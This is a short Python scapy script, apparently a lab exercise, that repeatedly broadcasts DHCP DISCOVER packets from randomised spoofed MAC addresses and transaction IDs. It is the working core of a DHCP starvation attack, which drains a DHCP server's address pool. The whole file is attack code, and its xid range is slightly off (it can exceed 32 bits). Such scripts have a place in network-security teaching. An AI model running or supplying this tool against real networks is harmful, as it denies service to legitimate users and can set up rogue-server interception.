#!/usr/bin/python3

from scapy.all import *
from random import randint

dev = "eth0" # change if needed

while (True):
    # TODO: set random MAC Address for spoofed DISCOVER
    src_mac_address = RandMAC()
    print ("Spoofed MAC:", src_mac_address)

    # to set random xid in the appropriate range generate a random integer between 0 and 2^32 (4294967295) and use that as the xid. For
    rand_xid = random.randint(1,2**32)

    # TODO: set the type of eth packet according to the spec of DHCP
    # dest is set to the broadcast address
    # src: we pretend to be from a random mac address
    # type: IP Ethernet type is denoted by 0x800
    
    ethernet = Ether(dst="ff:ff:ff:ff:ff:ff",src=src_mac_address,type= 0x800)

    # the dst ip in case of DHCP DISCOVER is broadcast dst:
    ip = IP(src ="0.0.0.0",dst='255.255.255.255')
    udp = UDP (sport=68,dport=67)
    bootp = BOOTP(chaddr=src_mac_address,ciaddr="0.0.0.0",xid=rand_xid)
    dhcp = DHCP(options=[("message-type","discover"),"end"])
    packet = ethernet / ip / udp / bootp / dhcp
    #packet.show() # TODO: uncomment for debug, then comment before execution. 
    sendp(packet, iface=dev)
    input("sent spoofed DHCP-DISCOVER. press Enter to send another one")
